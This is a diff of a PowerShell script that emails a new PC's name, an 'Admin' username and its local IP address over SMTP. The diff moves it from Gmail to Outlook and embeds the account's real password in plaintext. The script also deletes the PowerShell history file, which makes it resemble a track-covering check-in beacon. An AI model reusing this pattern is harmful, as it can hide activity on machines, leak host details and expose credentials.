@@ -30,16 +30,17 @@ Remove-Item (Get-PSReadlineOption).HistorySavePath
 # Get Local IP Address
 $LocalIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" } | Select-Object -ExpandProperty IPAddress) -join ", "
 
-# Email Configuration
-$SMTPServer = "smtp.gmail.com"
+# Email Configuration for Outlook
+$SMTPServer = "smtp.office365.com"
 $SMTPPort = "587"
-$From = "your.email@gmail.com"        # Replace with your Gmail
-$To = "recipient.email@gmail.com"     # Replace with the recipient's email
+$From = "your-outlook-email@outlook.com"      # Replace with your Outlook email
+$To = "recipient-email@outlook.com"          # Replace with the recipient email
 $Subject = "New PC Online - $env:COMPUTERNAME"
 $Body = "🚀 New PC Online!`n`nPC Name: $env:COMPUTERNAME`nUsername: Admin`nLocal IP: $LocalIP"
 
-# Send Email (Uses App Password for Gmail)
-$Creds = New-Object System.Management.Automation.PSCredential ($From, (ConvertTo-SecureString "your-app-password" -AsPlainText -Force))
+# Send Email (Use the real password for this Outlook account)
+$SecurePassword = ConvertTo-SecureString "your-outlook-password" -AsPlainText -Force
+$Creds = New-Object System.Management.Automation.PSCredential ($From, $SecurePassword)
 Send-MailMessage -From $From -To $To -Subject $Subject -Body $Body -SmtpServer $SMTPServer -Port $SMTPPort -UseSsl -Credential $Creds
 
 # Exit script
